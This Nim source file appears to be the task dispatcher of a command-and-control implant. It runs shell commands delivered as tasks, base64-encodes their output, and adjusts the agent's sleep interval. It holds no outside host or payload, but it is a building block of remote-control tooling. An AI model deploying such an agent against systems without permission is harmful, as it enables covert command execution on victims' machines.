import base64, strutils
import ./types 
import ./commands/commands

proc handleTask*(task: Task, config: AgentConfig): Task = 
    
    # Handle task command
    case task.command: 

    of ExecuteShell: 
        
        let (output, status) = taskShell(task.args)
        echo output

        return Task(
            id: task.id, 
            agent: task.agent,
            command: task.command,
            args: task.args,
            result: encode(output), # Base64 encode result
            status: status
        )

    of Sleep: 
        # Parse arguments
        let delay: int = parseInt(task.args[0])
        
        # Execute task
        let (output, status) = taskSleep(delay)
        
        # Update sleep delay in agent config
        if status == Completed: 
            config.sleep = delay

        # Return result
        return Task(
            id: task.id, 
            agent: task.agent,
            command: task.command,
            args: task.args,
            result: encode(output),
            status: status
        )

    else: 
        echo "Not implemented"
        return nil 

    return task